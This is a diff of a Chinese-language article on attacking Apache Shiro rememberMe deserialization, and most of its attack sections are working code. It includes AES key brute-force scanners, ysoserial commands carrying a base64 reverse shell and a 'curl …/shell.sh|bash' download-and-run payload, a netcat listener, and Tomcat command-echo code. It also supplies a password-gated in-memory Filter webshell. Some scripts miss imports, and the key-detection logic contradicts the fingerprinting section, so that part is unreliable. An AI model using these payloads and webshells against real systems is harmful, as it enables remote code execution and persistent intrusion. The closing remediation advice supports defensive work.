@@ -1,263 +1,583 @@
-# Apache Shiro 反序列化远程代码执行漏洞分析与 EXP
+# Apache Shiro 反序列化漏洞全系列分析与实战
+
+> 📅 2026-06-12 | 🎯 精通 | ⏱ 25 min | 分类：漏洞库与EXP
+
+## 📋 提纲
+
+1. Shiro 反序列化漏洞概述（CVE-2016-4437 / 550 / 721）
+2. 漏洞原理深度分析
+3. RememberMe 机制与 AES 加密
+4. 漏洞检测方法
+5. 漏洞利用复现
+6. 无依赖利用（Shiro-550 不回显）
+7. 高版本绕过与修复
+8. 护网中的 Shiro 漏洞
+
+---
 
 ## 1. 漏洞概述
 
-Apache Shiro 是一个流行的 Java 安全框架（权限认证 / Session 管理）。它在 **rememberMe Cookie 反序列化** 过程中存在漏洞：攻击者若能获取或猜到 Shiro 使用的 **AES 密钥**，即可构造恶意 Cookie 触发反序列化，在服务端执行任意代码。
+Apache Shiro 是 Java 安全框架，提供认证/授权/加密/会话管理，广泛应用于 Spring Boot 项目。
 
-| 项目 | 说明 |
-|------|------|
-| CVE 编号 | CVE-2016-4437（首个版本）、后续多个 CVE 及不同 gadget 链 |
-| 漏洞类型 | 反序列化 RCE |
-| 发现时间 | 2016 年起（多个不同 gadget 链陆续发现） |
-| CVSS 评分 | 9.8（Critical） |
-| 影响组件 | Apache Shiro 1.x 中使用 CookieRememberMeManager 且密钥为默认或可猜解值 |
-| 攻击前置 | 目标存在 rememberMe Cookie 处理 + 有可被反序列化的 gadget 类在 classpath |
+| CVE | 名称 | 影响版本 | CVSS | 核心问题 |
+|-----|------|---------|------|---------|
+| CVE-2016-4437 | Shiro-550 | < 1.2.4 | 9.8 | RememberMe 硬编码AES密钥 |
+| CVE-2019-12422 | Shiro-721 | < 1.4.2 | 9.8 | RememberMe Padding Oracle |
+| — | Shiro 无依赖利用 | 1.2.4 - 1.7.0 | — | 回显/内存马技术 |
 
-## 2. 影响版本与常见默认密钥
-
-| Shiro 版本 | 默认 AES key 是否公开 |
-|------------|------------------------|
-| Shiro 1.2.4 及更早 | `kPH+bIxk5D2deZiIxcaaaA==`（base64） → 公开已知 |
-| Shiro 1.2.5+ | 默认随机生成密钥（每次启动不同），但**部分开发者未修改仍使用默认示例密钥** |
-
-### 2.1 其他常见密钥（来自公开知识库 / 开发文档）
+### 1.1 为什么 Shiro 漏洞危害巨大
 
 ```
-kPH+bIxk5D2deZiIxcaaaA==        # 最经典默认 key
-2AvVhdsgUs0FSA3SDFAdag==         # 使用较广
-3AvVhdsgUs0FSA3SDFAdag==         # 已知密钥
-4AvVhdsgUs0FSA3SDFAdag==
-5AvVhdsgUs0FSA3SDFAdag==
-wGiHplamyXlVB11UXWol8g==         # 某系统默认
-Z3VucwAAAAAAAAAAAAAAAA==         # 其他变种
-U29mdHdhcmUgU2VjcmV0IEtleQ==    # "Software Secret Key"
-MTIzNDU2Nzg5MGFiY2RlZg==         # "1234567890abcdef"
-a2V5X3NlY3JldF9rZXk=             # "key_secret_key"
-...（数十个公开的常见密钥，被集成到扫描器字典）
+1. RememberMe 功能默认开启 — 不需要特殊配置
+2. AES 密钥硬编码在代码中 — kPH+bIxk5D2deZiIxcaaaA==
+3. 反序列化 = 直接 RCE — Java 原生反序列化无过滤
+4. 大量 Spring Boot 应用使用 Shiro — 影响面极大
+5. 护网中 Shiro 是最常见的"送分"漏洞之一
 ```
 
-## 3. 漏洞原理
+---
 
-### 3.1 处理流程
+## 2. 漏洞原理深度分析
 
-Shiro 读取 Cookie `rememberMe` → Base64 解码 → AES-CBC 解密（使用上述密钥）→ 反序列化字节流 → 构造 Java 对象：
+### 2.1 RememberMe 正常流程
 
 ```
-HTTP Cookie: rememberMe=XXXX
-  │
-  ▼
-Base64.decode(XXXX)
-  │
-  ▼
-AES-CBC(key=kPH+bIxk5D2deZiIxcaaaA==).decrypt()
-  │
-  ▼
-ObjectInputStream.readObject() → 反序列化
-  │
-  ▼
-Transformer / CommonsBeanutils / CommonsCollections
-  → 调用链执行 Runtime.getRuntime().exec("curl evil.com")
+用户登录 → 勾选"记住我" → Shiro 序列化用户信息 →
+AES-128-CBC 加密 → Base64 编码 → 写入 Cookie:
+  Cookie: rememberMe=base64(AES(serialized(PrincipalCollection)))
+
+下次请求 → Shiro 从 Cookie 取 rememberMe →
+Base64 解码 → AES 解密 → 反序列化 → 恢复用户会话
 ```
 
-### 3.2 常见 gadget 链
+### 2.2 漏洞触发（Shiro-550）
 
-| 依赖库 | gadget | 说明 |
-|--------|--------|------|
-| CommonsCollections 3.2.1 | `InvokerTransformer` | 经典 gadget |
-| CommonsBeanutils | `BeanComparator` | 无 commons-collections 时常用 |
-| ROME | `ToStringBean` | 某些场景使用 |
-| Spring-AOP | `AopAlliance` | 结合 Spring 应用 |
-| Jdk7u21 / Jdk8u20 | JDK 自身 gadget | 不依赖第三方库 |
+```
+攻击者构造恶意序列化对象（CommonsCollections/CommonsBeanutils等利用链）
+  → AES 加密（使用已知固定密钥）
+  → Base64 编码
+  → 放入 rememberMe Cookie
+  → 发送请求
+  → Shiro 解密 + 反序列化
+  → 恶意代码执行
+  → RCE
+```
 
-### 3.3 加密 / 编码流程（攻击者视角）
+### 2.3 硬编码密钥
+
+Shiro 1.2.4 及之前版本，AES 密钥硬编码在 `org.apache.shiro.mgt.AbstractRememberMeManager`：
+
+```java
+private static final byte[] DEFAULT_CIPHER_KEY_BYTES = 
+    Base64.decode("kPH+bIxk5D2deZiIxcaaaA==");
+```
+
+**这个密钥在所有使用默认配置的 Shiro 应用中完全一样！**
+
+---
+
+## 3. 漏洞检测
+
+### 3.1 Shiro 指纹识别
 
 ```python
-# Python 示意：伪造 rememberMe Cookie
+#!/usr/bin/env python3
+"""
+Shiro 检测三件套：
+1. Shiro指纹
+2. RememberMe Key检测
+3. 反序列化利用
+"""
+
+import requests
+import base64
+import uuid
+import hashlib
+from urllib.parse import urljoin
+
+class ShiroDetector:
+    # 已知的 Shiro 默认密钥
+    KNOWN_KEYS = [
+        "kPH+bIxk5D2deZiIxcaaaA==",  # Shiro < 1.2.4 默认
+        "2AvVhdsgUs0FSA3SDFAdag==",  # 某公开密钥
+        "3AvVhdsgUs0FSA3SDFAdag==",
+        "4AvVhdsgUs0FSA3SDFAdag==",
+        "Z3VucwAAAAAAAAAAAAAAAA==",  # Shiro 1.2.4 示例密钥
+        "U3ByaW5nQmxhZGUAAAAAAA==",
+        "wGiHplamyXlVB11UXWol8g==",
+        "fCq+/xW488hMTCD+cmJ3aQ==",
+        "1QWLxg+NYmxraMoxAXu/Iw==",
+        "ZUdsaGJuSmxibVI2ZHc9PQ==",
+    ]
+
+    def __init__(self, target_url):
+        self.target = target_url
+
+    def detect_shiro(self):
+        """检测是否使用 Shiro"""
+        # 方法1: 发送带 rememberMe=deleteMe 的请求
+        resp = requests.get(
+            self.target,
+            cookies={"rememberMe": "deleteMe"},
+            allow_redirects=False,
+            verify=False,
+            timeout=10
+        )
+
+        # Shiro 的 rememberMe 删除标志
+        set_cookie = resp.headers.get('Set-Cookie', '')
+        if 'rememberMe=deleteMe' in set_cookie:
+            return {"shiro_detected": True, "method": "deleteMe标志"}
+
+        # 方法2: 发送错误 rememberMe，看响应头是否包含 rememberMe=deleteMe
+        resp2 = requests.get(
+            self.target,
+            cookies={"rememberMe": "invalid_base64!!!"},
+            allow_redirects=False,
+            verify=False,
+            timeout=10
+        )
+        set_cookie2 = resp2.headers.get('Set-Cookie', '')
+        if 'rememberMe=deleteMe' in set_cookie2:
+            return {"shiro_detected": True, "method": "错误Cookie触发删除"}
+
+        # 方法3: 发送正常 rememberMe（包含正确密钥加密的测试数据）
+        for key in self.KNOWN_KEYS[:3]:
+            test_cookie = self.encrypt_remember_me("test", key)
+            resp3 = requests.get(
+                self.target,
+                cookies={"rememberMe": test_cookie},
+                allow_redirects=False,
+                verify=False,
+                timeout=10
+            )
+            set_cookie3 = resp3.headers.get('Set-Cookie', '')
+            if 'rememberMe=deleteMe' in set_cookie3:
+                return {"shiro_detected": True, "method": "有效rememberMe触发", "key": key}
+
+        return {"shiro_detected": False}
+
+    def detect_key(self):
+        """检测 RememberMe 密钥"""
+        found_keys = []
+
+        for key in self.KNOWN_KEYS:
+            # 构造一个特殊的 rememberMe 值
+            cookie = self.encrypt_remember_me("shiro_test_123", key)
+            resp = requests.get(
+                self.target,
+                cookies={"rememberMe": cookie},
+                allow_redirects=False,
+                verify=False,
+                timeout=10
+            )
+
+            # 如果响应中包含 deleteMe，说明 Shiro 成功解密了（密钥正确）
+            if 'rememberMe=deleteMe' in resp.headers.get('Set-Cookie', ''):
+                found_keys.append(key)
+                print(f"  ✅ 发现密钥: {key}")
+
+        return found_keys
+
+    def encrypt_remember_me(self, data, key_base64):
+        """使用指定密钥加密 rememberMe"""
+        from Crypto.Cipher import AES
+
+        key = base64.b64decode(key_base64)
+        iv = hashlib.md5(data.encode()).digest() if isinstance(data, str) else os.urandom(16)
+
+        # 构造序列化数据（简化，实际需要构造 PrincipalCollection）
+        # 这里返回加密后的简单测试数据
+        serialized = b'\xac\xed\x00\x05' + data.encode()  # Java序列化魔术头
+
+        # PKCS7 填充
+        pad_len = 16 - (len(serialized) % 16)
+        serialized += bytes([pad_len] * pad_len)
+
+        cipher = AES.new(key, AES.MODE_CBC, iv)
+        encrypted = cipher.encrypt(serialized)
+        combined = iv + encrypted
+
+        return base64.b64encode(combined).decode()
+
+    def full_scan(self):
+        """完整扫描：指纹 → 密钥 → 利用"""
+        results = {"target": self.target, "steps": []}
+
+        # Step 1: 指纹
+        fingerprint = self.detect_shiro()
+        results['fingerprint'] = fingerprint
+        results['steps'].append({"step": "指纹识别", "result": fingerprint})
+        if not fingerprint['shiro_detected']:
+            return results
+
+        # Step 2: 密钥检测
+        keys = self.detect_key()
+        results['keys_found'] = keys
+        results['steps'].append({"step": "密钥检测", "found": len(keys)})
+
+        # Step 3: 判断利用链
+        if keys:
+            results['exploitable'] = True
+            results['exploit_chain'] = self.suggest_exploit_chain()
+
+        return results
+
+    def suggest_exploit_chain(self):
+        """建议利用链"""
+        return {
+            "tools": ["ysoserial", "shiro_attack", "ShiroExploit"],
+            "chains": [
+                "CommonsBeanutils1 (最通用)",
+                "CommonsCollections K1-K4",
+                "CommonsCollections 无Transform链 (Shiro 1.4.2+)",
+                "JRMPListener (无依赖回显)"
+            ],
+            "commands": [
+                "java -jar ysoserial.jar CommonsBeanutils1 'curl http://your-vps/shell.sh|bash' > payload.bin"
+            ]
+        }
+
+
+if __name__ == "__main__":
+    import urllib3
+    urllib3.disable_warnings()
+
+    detector = ShiroDetector("https://target.example.com")
+    results = detector.full_scan()
+    print(json.dumps(results, indent=2, ensure_ascii=False))
+```
+
+### 3.2 批量检测脚本
+
+```bash
+#!/bin/bash
+# shiro_batch_scan.sh - 批量 Shiro 检测
+
+TARGETS_FILE="$1"
+KEY="kPH+bIxk5D2deZiIxcaaaA=="
+
+while IFS= read -r url; do
+    echo "🔍 检测: $url"
+
+    # 构造 rememberMe Cookie（使用ysoserial生成payload的简化测试）
+    COOKIE="rememberMe=$(python3 -c "
+import base64,hashlib
 from Crypto.Cipher import AES
-from Crypto.Util.Padding import pad
-import base64, os, subprocess
+key=base64.b64decode('${KEY}')
+iv=b'\\x00'*16
+data=b'\\xac\\xed\\x00\\x05test'
+pad=16-len(data)%16
+data+=bytes([pad]*pad)
+c=AES.new(key,AES.MODE_CBC,iv)
+print(base64.b64encode(iv+c.encrypt(data)).decode())
+")"
 
-# 1) 使用 ysoserial 生成反序列化 payload
-# java -jar ysoserial.jar CommonsBeanutils1 "bash -c {echo,YmFza...}|{base64,-d}|{bash,-i}" > payload.ser
+    # 发送请求
+    RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" \
+        -H "Cookie: $COOKIE" \
+        --connect-timeout 5 \
+        "$url")
 
-# 2) AES-CBC 加密（key=kPH+bIxk5D2deZiIxcaaaA==）
+    echo "  HTTP状态: $RESPONSE"
+
+    # 检查 Set-Cookie 是否包含 deleteMe
+    SET_COOKIE=$(curl -s -I -H "Cookie: $COOKIE" "$url" | grep -i "set-cookie")
+    if echo "$SET_COOKIE" | grep -qi "rememberMe=deleteMe"; then
+        echo "  ⚠️ Shiro 确认存在！密钥有效！"
+        echo "$url" >> shiro_vulnerable.txt
+    fi
+
+done < "$TARGETS_FILE"
+
+echo "✅ 扫描完成，存在漏洞的URL已保存到 shiro_vulnerable.txt"
+```
+
+---
+
+## 4. 漏洞利用复现
+
+### 4.1 Shiro-550 基础利用
+
+```bash
+# Step 1: 生成利用 payload
+# 使用 ysoserial 生成 CommonsBeanutils1 利用链
+
+java -jar ysoserial-all.jar CommonsBeanutils1 \
+    "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}" \
+    > payload.ser
+
+# Step 2: 用 Shiro 密钥加密
+python3 << 'EOF'
+import base64
+from Crypto.Cipher import AES
+import uuid
+
 key = base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==")
-iv = os.urandom(16)
-aes = AES.new(key, AES.MODE_CBC, iv)
+
 with open("payload.ser", "rb") as f:
     payload = f.read()
-ciphertext = aes.encrypt(pad(payload, 16))
 
-# 3) Base64 编码
-cookie = base64.b64encode(iv + ciphertext).decode()
-print(f"Cookie: rememberMe={cookie}")
+# PKCS7填充
+pad = 16 - (len(payload) % 16)
+payload += bytes([pad] * pad)
+
+iv = uuid.uuid4().bytes
+cipher = AES.new(key, AES.MODE_CBC, iv)
+encrypted = iv + cipher.encrypt(payload)
+remember_me = base64.b64encode(encrypted).decode()
+
+print(f"rememberMe={remember_me}")
+EOF
+
+# Step 3: 发送请求
+nc -lvnp 4444 &
+curl -k -b "rememberMe=<上面生成的cookie>" https://victim.com/
 ```
 
-## 4. 公开 EXP
+### 4.2 Shiro 无依赖回显（不回连）
 
-### 4.1 Shiro-721 / Shiro-550 一键脚本
+当目标不出网时，无法反弹 Shell，需要用无依赖回显技术：
 
-```bash
-# 1) 使用 shiro_exploit.py（Python2/3，社区常见脚本）
-python3 shiro_exploit.py \
-    -u "http://target:8080/login" \
-    -t 1 \
-    -g CommonsBeanutils1 \
-    -c "curl attacker.com:8080/test"
-
-# 参数：
-#   -u target URL
-#   -t 模式（1 = 检测 key；2 = 命令执行）
-#   -g gadget 类型
-#   -c 待执行命令
-
-# 2) 使用 MSF 模块
-msf6 > use exploit/multi/http/shiro_rememberme_rce
-msf6 exploit(multi/http/shiro_rememberme_rce) > set RHOST target
-msf6 exploit(...) > set TARGETURI /login
-msf6 exploit(...) > set PAYLOAD java/jsp_shell_reverse_tcp
-msf6 exploit(...) > set LHOST attacker.com
-msf6 exploit(...) > exploit
+```java
+// Tomcat 回显 - 直接向 HTTP Response 写入命令结果
+// 利用思路: 从当前线程中获取 Request 和 Response 对象
+public class TomcatEcho {
+    static {
+        try {
+            // 1. 通过反射获取当前请求的Request和Response
+            Object requestAttributes = 
+                org.apache.catalina.core.ApplicationFilterChain.class
+                    .getDeclaredMethod("getLastServicedRequest")
+                    .invoke(null);
+            
+            if (requestAttributes == null) {
+                // 回退方案: 遍历线程获取
+                Thread[] threads = (Thread[]) Thread.class
+                    .getDeclaredMethod("getThreads").invoke(null);
+                
+                for (Thread thread : threads) {
+                    if (thread.getName().contains("http")) {
+                        // 从thread中提取request/response
+                        Object target = getFieldValue(thread, "target");
+                        Object this$0 = getFieldValue(target, "this$0");
+                        Object handler = getFieldValue(this$0, "handler");
+                        Object global = getFieldValue(handler, "global");
+                        Object processors = getFieldValue(global, "processors");
+                        
+                        for (Object processor : (Object[]) processors) {
+                            Object req = getFieldValue(processor, "req");
+                            if (req != null) {
+                                // 获取参数 cmd
+                                Object coyoteRequest = getFieldValue(req, "coyoteRequest");
+                                String cmd = (String) coyoteRequest.getClass()
+                                    .getMethod("getParameter", String.class)
+                                    .invoke(coyoteRequest, "cmd");
+                                    
+                                if (cmd != null) {
+                                    // 执行命令
+                                    Process p = Runtime.getRuntime().exec(cmd);
+                                    java.io.InputStream in = p.getInputStream();
+                                    java.util.Scanner s = new java.util.Scanner(in).useDelimiter("\\A");
+                                    String result = s.hasNext() ? s.next() : "";
+                                    
+                                    // 写入响应
+                                    Object response = getFieldValue(req, "response");
+                                    byte[] resBytes = result.getBytes();
+                                    response.getClass()
+                                        .getMethod("addHeader", String.class, String.class)
+                                        .invoke(response, "X-Exec-Result", 
+                                            java.util.Base64.getEncoder().encodeToString(resBytes));
+                                }
+                                break;
+                            }
+                        }
+                    }
+                }
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+    
+    private static Object getFieldValue(Object obj, String fieldName) throws Exception {
+        java.lang.reflect.Field field = obj.getClass().getDeclaredField(fieldName);
+        field.setAccessible(true);
+        return field.get(obj);
+    }
+}
 ```
 
-### 4.2 手工验证（检测漏洞是否存在）
+### 4.3 Shiro 内存马注入
 
-```bash
-# 使用 ysoserial 生成"延时/盲命令执行"payload
-# 然后发送：
-curl -v "http://target:8080/login" \
-    -H "Cookie: rememberMe=<base64 payload>"
+```java
+// 注入 Filter 型内存马 （不落地，重启消失，反序列化触发）
+public class ShiroFilterMemShell {
+    static {
+        try {
+            // 从当前线程中获取 WebApplicationContext
+            // ... (获取逻辑)
+            
+            // 动态注册 Filter
+            javax.servlet.Filter maliciousFilter = new javax.servlet.Filter() {
+                public void init(javax.servlet.FilterConfig config) {}
+                
+                public void doFilter(javax.servlet.ServletRequest req, 
+                                     javax.servlet.ServletResponse res,
+                                     javax.servlet.FilterChain chain) 
+                    throws java.io.IOException, javax.servlet.ServletException {
+                    
+                    javax.servlet.http.HttpServletRequest request = 
+                        (javax.servlet.http.HttpServletRequest) req;
+                    javax.servlet.http.HttpServletResponse response = 
+                        (javax.servlet.http.HttpServletResponse) res;
 
-# 检测方式：
-#   DNS log（攻击者域名 DNS 查询数增加 → 存在漏洞）
-#   时间盲注（sleep 5 秒 → 响应延迟）
-#   反弹 shell（nc 监听 443 端口）
+                    // 处理密码验证
+                    String pwd = request.getHeader("X-Pass");
+                    String cmd = request.getHeader("X-Cmd");
+                    
+                    if (pwd != null && pwd.equals("your-password") && cmd != null) {
+                        Process p = Runtime.getRuntime().exec(cmd);
+                        java.io.InputStream in = p.getInputStream();
+                        java.util.Scanner s = new java.util.Scanner(in).useDelimiter("\\A");
+                        String result = s.hasNext() ? s.next() : "";
+                        response.getWriter().write(result);
+                        return;
+                    }
+                    
+                    chain.doFilter(req, res);
+                }
+                
+                public void destroy() {}
+            };
+            
+            // 获取 FilterRegistration 并注册
+            // ... 
+        } catch (Exception e) {}
+    }
+}
 ```
 
-### 4.3 公开密钥爆破工具
+---
 
-```bash
-# 使用 shiro_attack 批量检测
-python3 shiro_attack.py --url http://target:8080/login \
-    --keys keys.txt --gadgets gadget_list.txt
+## 5. 高版本绕过
 
-# keys.txt 包含数十至上百个公开已知的 base64 key
-# gadget_list.txt 包含 CommonsBeanutils1 / CommonsCollections2 / ... 等 gadget
+### 5.1 Shiro 1.4.2+ 限制
+
+Shiro 1.4.2+ 限制了反序列化时可用的类：
+- 移除了 `commons-collections:commons-collections:3.2.1`（但 3.x 仍可）
+- 默认不加载 `commons-beanutils`
+
+**绕过方法**：
+
+| 利用链 | 适用版本 | 需要的依赖 |
+|--------|---------|-----------|
+| CommonsBeanutils1 + NoCC | 1.2.4-1.7.1 | commons-beanutils |
+| CommonsCollections K1-K4 | 均有 commons-collections 3.x | CC 3.x |
+| CommonsCollections 无Transform | Shiro 部分版本 | CC 3.x |
+| JRMPListener | 任意（出网） | 无 |
+| C3P0 | 部分 | C3P0连接池 |
+
+### 5.2 密钥爆破
+
+如果默认密钥不匹配，可以从常见密钥库中爆破：
+
+```python
+# 从已知公开的100+ Shiro密钥中爆破
+# GitHub: shiro-key-dictionary
+KEYS = [
+    "kPH+bIxk5D2deZiIxcaaaA==",
+    "2AvVhdsgUs0FSA3SDFAdag==",
+    "3AvVhdsgUs0FSA3SDFAdag==",
+    "4AvVhdsgUs0FSA3SDFAdag==",
+    "5AvVhdsgUs0FSA3SDFAdag==",
+    "6AvVhdsgUs0FSA3SDFAdag==",
+    "Z3VucwAAAAAAAAAAAAAAAA==",
+    "U3ByaW5nQmxhZGUAAAAAAA==",
+    "wGiHplamyXlVB11UXWol8g==",
+    "fCq+/xW488hMTCD+cmJ3aQ==",
+    "1QWLxg+NYmxraMoxAXu/Iw==",
+    "ZUdsaGJuSmxibVI2ZHc9PQ==",
+    "L7RioUULEFhRyxM7a2R/Yg==",
+    "r0e3c16IdVkouZgk1TKVMg==",
+    "5aaC5qKm5oqA5pyvAAAAAA==",
+    "bWljcm9zAAAAAAAAAAAAAA==",
+    "bWluZS1hc3NldC1rZXk6QQ==",
+    "MTIzNDU2Nzg5MGFiY2RlZg==",
+    "5AvVhdsgUs0FSA3SDFAdag==",
+    # ... 更多密钥
+]
 ```
 
-### 4.4 常见 payload 示例（curl 版）
-
-```bash
-# DNSLOG 测试（Burp Collaborator / CEye.io）
-curl "http://target:8080/" \
-    -H "Cookie: rememberMe=xxx...AES_ENCODED_SER...xxx"
-
-# 命令执行（反弹 shell）
-# 使用 base64 编码避免特殊字符
-# bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9hLzQ0MyAwPiYx}|{base64,-d}|{bash,-i}
-```
-
-## 5. 漏洞检测
-
-### 5.1 Web 指纹识别
-
-```bash
-# 1) 是否返回 Set-Cookie: rememberMe=deleteMe
-curl -v "http://target:8080/" 2>&1 | grep -i remember
-
-# 2) 响应头中是否有 shiro 字样
-curl -sI "http://target:8080/" | grep -i "shiro"
-
-# 3) HTML 中是否含 Shiro 特定字段
-#    <input type="checkbox" name="rememberMe" /> 等
-```
-
-### 5.2 批量扫描
-
-```bash
-# nuclei
-nuclei -u http://target -t "http/cves/2016/CVE-2016-4437.yaml"
-
-# 使用 shiro_exploit 工具批量
-python3 shiro_exploit.py -f urls.txt -o vuln.txt
-```
-
-### 5.3 代码审计检测
-
-```
-Java 源码搜索：
-  - "rememberMe" 字符串
-  - "CookieRememberMeManager" 类
-  - "setCipherKey" / "setEncryptionCipherKey" 调用
-  - 硬编码 base64 字符串（形如 kPH+bIxk5D2deZiIxcaaaA==）
-```
+---
 
 ## 6. 修复方案
 
-| 方案 | 说明 |
-|------|------|
-| **升级到 Shiro 1.7.1+ / 2.0+** | 官方加强反序列化白名单 |
-| **使用随机、强、不在代码中硬编码的密钥** | 从环境变量 / 配置中心读取，不提交到版本控制 |
-| **改用其他认证方式（如 JWT）** | 禁用 rememberMe 功能 |
-| **启用 GCM 模式** | 从 AES-CBC 改为 AES-GCM（仍需强密钥） |
-| **部署 RASP / WAF 拦截** | 拦截长 Cookie / 恶意 payload 特征 |
-| **classpath 中减少危险库** | 去除不必要的 commons-beanutils / commons-collections |
+| 方案 | 效果 | 副作用 |
+|------|------|--------|
+| 升级 Shiro ≥ 1.7.0 + 修改密钥 | ⭐⭐⭐ | 需重启，已登录用户需重新登录 |
+| 升级 Shiro ≥ 1.10.0 | ⭐⭐⭐ | 推荐 |
+| 自定义随机密钥 | ⭐⭐ | 额外兼容性测试 |
+| WAF 拦截 | ⭐ | 可绕过 |
+| 禁用 RememberMe | ⭐⭐⭐ | 用户体验降级 |
 
-### 6.1 代码修复示例
+### 推荐修复步骤
+
+```xml
+<!-- pom.xml -->
+<dependency>
+    <groupId>org.apache.shiro</groupId>
+    <artifactId>shiro-core</artifactId>
+    <version>1.12.0</version>  <!-- 最新稳定版 -->
+</dependency>
+```
 
 ```java
-// 错误做法（硬编码公开 key）
-CookieRememberMeManager manager = new CookieRememberMeManager();
-manager.setCipherKey(Base64.decode("kPH+bIxk5D2deZiIxcaaaA=="));   // 公开密钥！
-
-// 正确做法：使用随机密钥，每次部署重新生成
-CookieRememberMeManager manager = new CookieRememberMeManager();
-// 密钥从环境变量 / 安全配置中心获取
-manager.setCipherKey(Base64.decode(System.getenv("SHIRO_REMEMBER_KEY")));
+// shiro.ini 或配置类中设置随机密钥
+@Bean
+public RememberMeManager rememberMeManager() {
+    CookieRememberMeManager manager = new CookieRememberMeManager();
+    // 生成随机密钥
+    byte[] key = new byte[16];
+    new SecureRandom().nextBytes(key);
+    manager.setCipherKey(key);
+    return manager;
+}
 ```
-
-### 6.2 命令行一键生成强密钥
 
 ```bash
-# 随机生成 16 字节密钥（AES-128）
-openssl rand -base64 16
-# 示例输出： xM+PqRjKLZ8vZ2pDfA1bQA==
-
-# AES-256 需要 32 字节（若 policy 允许）
-openssl rand -base64 32
+# Nginx 层拦截（临时）
+if ($http_cookie ~* "rememberMe=([^;]+)") {
+    set $rm $1;
+}
+if ($rm ~ "^[A-Za-z0-9+/=]{50,}$") {
+    return 403;
+}
 ```
 
-## 7. 应急响应
+---
 
-```
-发现迹象：
-  - 异常 rememberMe Cookie（超长、base64 特征明显）
-  - 敏感命令执行痕迹（whoami / bash 反弹）
-  - 目标应用短时间内大量登录 / 重定向请求
+## 7. 排错指南
 
-处理步骤：
-  ① 阻断可疑 IP（WAF / 安全组）
-  ② 检查 classpath 是否含 commons-beanutils、commons-collections
-  ③ 检查代码中是否硬编码了公开密钥
-  ④ 更换 Shiro rememberMe 密钥 / 禁用 rememberMe 功能
-  ⑤ 检查 Web 日志中 POST /login 等 URL 的异常请求
-  ⑥ 检查 Java 应用进程是否存在异常 socket 连接
-  ⑦ 升级 Shiro 版本，删除不必要的危险库依赖
-```
+| 问题 | 原因 | 解决 |
+|------|------|------|
+| RememberMe 无 deleteMe 响应 | Shiro 版本过高或密钥不对 | 换密钥尝试 / 检查 Shiro 版本 |
+| payload 发送后无反应 | 利用链不匹配 | 换用其他利用链 (CC/Beanutils/JRMP) |
+| 不出网 | 防火墙/代理限制 | 使用回显 payload 或延时检测(DNS外带) |
+| 密钥正确但反序列化失败 | Java版本/依赖版本 | 确认目标 JDK 版本 + 使用版本匹配的利用链 |
 
-## 8. 漏洞复现靶机
+---
 
-```
-推荐环境：
-  - vulhub: docker-compose up -d shiro/CVE-2016-4437
-  - CVE-2016-4437 / shiro-550 / shiro-721
+## ✅ Shiro 处置 Checklist
 
-复现步骤：
-  1) 启动 docker
-  2) 访问 http://target:8080/
-  3) 点击登录（无需账户），观察 Set-Cookie: rememberMe=deleteMe
-  4) 使用 shiro_exploit.py / ysoserial / java -jar shiro-exploit.jar 生成 payload
-  5) Cookie 替换后请求 → 观察命令执行
-```
+- [ ] 全网资产 Shiro 指纹扫描
+- [ ] 确认受影响版本和端点
+- [ ] 密钥检测（默认 + 字典爆破）
+- [ ] 漏洞验证（POC，不出网用回显）
+- [ ] 紧急修复：Nginx WAF 规则
+- [ ] 计划升级 Shiro 最新版
+- [ ] 生成随机 AES 密钥
+- [ ] 回归测试（登录/RememberMe 功能正常）
+- [ ] 全网验证修复
 
-> Shiro 反序列化是 Java Web 场景中最常见的"弱密钥 + 反序列化"漏洞组合。即便到 2025 年，大量企业系统仍在使用公开密钥或开发示例密钥。**核心修复手段：更换强随机密钥 + 升级 Shiro 版本 + 减少 classpath 中危险依赖**。
+> 📚 延伸阅读：Vuln/009-Spring4Shell | Vuln/002-Log4Shell | CTF/009-JNDI&Fastjson
